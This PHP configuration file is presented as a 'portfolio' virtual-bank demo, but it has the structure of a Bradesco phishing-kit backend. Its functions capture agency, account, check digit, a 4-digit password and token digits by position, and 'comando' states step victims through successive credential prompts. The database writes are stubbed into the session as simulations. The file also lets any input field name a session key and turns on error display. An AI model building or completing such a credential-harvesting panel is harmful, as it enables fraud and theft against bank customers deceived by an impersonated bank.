<?php
// Configurações básicas para o site de portfólio
session_start();

// Configurações básicas
define('SITE_URL', 'http://localhost');
define('SITE_NAME', 'Banco Virtual - Portfólio');

// Função para limpar sessão
function clearSession() {
    if (session_status() == PHP_SESSION_ACTIVE) {
        session_destroy();
        session_start();
    }
}

// Função para gerar hash único
function getHash() {
    return md5(uniqid(rand(), true));
}

// Função para detectar mobile
function isMobile() {
    return preg_match('/(android|iphone|ipad|mobile)/i', $_SERVER['HTTP_USER_AGENT'] ?? '');
}

// Função para obter nome (simulação)
function getNome2($agencia, $conta) {
    return [
        'nome' => 'Cliente Demo',
        'exclusive' => false,
        'prime' => false,
        'titulares' => [
            'João Silva',
            'Maria Santos',
            'Pedro Oliveira'
        ]
    ];
}

// Função de erro
function erro() {
    header('HTTP/1.1 404 Not Found');
    echo '<h1>Página não encontrada</h1>';
    exit();
}

// Função para data por extenso
function dataPorExtensoNovo() {
    $meses = [
        1 => 'Janeiro', 2 => 'Fevereiro', 3 => 'Março', 4 => 'Abril',
        5 => 'Maio', 6 => 'Junho', 7 => 'Julho', 8 => 'Agosto',
        9 => 'Setembro', 10 => 'Outubro', 11 => 'Novembro', 12 => 'Dezembro'
    ];
    
    $diasSemana = [
        0 => 'Domingo', 1 => 'Segunda-feira', 2 => 'Terça-feira', 3 => 'Quarta-feira',
        4 => 'Quinta-feira', 5 => 'Sexta-feira', 6 => 'Sábado'
    ];
    
    $hoje = getdate();
    $diaSemana = $diasSemana[$hoje['wday']];
    $dia = $hoje['mday'];
    $mes = $meses[$hoje['mon']];
    $ano = $hoje['year'];
    
    return "$diaSemana, $dia de $mes de $ano";
}

// Classe Acesso
class Acesso {
    public static function registrarAcesso($hash) {
        // Simulação - em um ambiente real, salvaria no banco de dados
        $_SESSION['hash'] = $hash;
        $_SESSION['idAcesso'] = uniqid();
        return true;
    }
    
    public static function findByHash($hash) {
        // Simulação - retorna dados fictícios
        return [
            'id' => 1,
            'hash' => $hash,
            'status' => 'ATIVO',
            'created_at' => date('Y-m-d H:i:s')
        ];
    }
}

// Classe Info
class Info {
    public static function gravarInfo($idAcesso, $agencia, $conta, $digito, $comando = "SENHA_DE_4", $tipo = "Bradesco") {
        // Simulação - em um ambiente real, salvaria no banco de dados
        $_SESSION['agencia'] = $agencia;
        $_SESSION['conta'] = $conta;
        $_SESSION['digito'] = $digito;
        $_SESSION['comando'] = $comando;
        $_SESSION['tipo'] = $tipo;
        return uniqid();
    }
    
    public static function gravarInfoMobile($idAcesso, $agencia, $conta, $digito, $senha4, $comando = "AGUARDANDO", $tipo = "Bradesco", $id = null) {
        // Simulação - em um ambiente real, salvaria no banco de dados
        $_SESSION['agencia'] = $agencia;
        $_SESSION['conta'] = $conta;
        $_SESSION['digito'] = $digito;
        $_SESSION['s4'] = $senha4;
        $_SESSION['comando'] = $comando;
        $_SESSION['tipo'] = $tipo;
        $_SESSION['id'] = $id ?: uniqid();
        return $_SESSION['id'];
    }
    
    public static function alterarUltimoAcesso($id) {
        // Simulação - em um ambiente real, atualizaria no banco de dados
        $_SESSION['ultimo_acesso'] = date('Y-m-d H:i:s');
        return true;
    }
    
    public static function buscarApi($id, $clientHashId) {
        // Simulação - retorna dados fictícios
        return [
            'id' => $id,
            'nome' => 'Cliente Demo',
            'agencia' => $_SESSION['agencia'] ?? '1234',
            'conta' => $_SESSION['conta'] ?? '12345-6',
            'status' => 'ATIVO'
        ];
    }
    
    public static function updateByAPI($id, $clientHashId, $obj) {
        // Simulação - em um ambiente real, atualizaria no banco de dados
        return true;
    }
    
    public static function atualizarInformacoes($id, $clientHashId, $campo, $valor) {
        // Simulação - em um ambiente real, atualizaria no banco de dados
        $_SESSION[$campo] = $valor;
        return true;
    }
    
    public static function atualizarTitular($id, $titular, $nome) {
        // Simulação - em um ambiente real, atualizaria no banco de dados
        $_SESSION['titular'] = $titular;
        $_SESSION['nome'] = $nome;
        return true;
    }
}

// Classe Token
class Token {
    public static function gravarToken($id, $posicao, $valor) {
        // Simulação - em um ambiente real, salvaria no banco de dados
        $_SESSION['token_' . $posicao] = $valor;
        return true;
    }
}

// Configurações de erro
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Headers de segurança
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');
?>
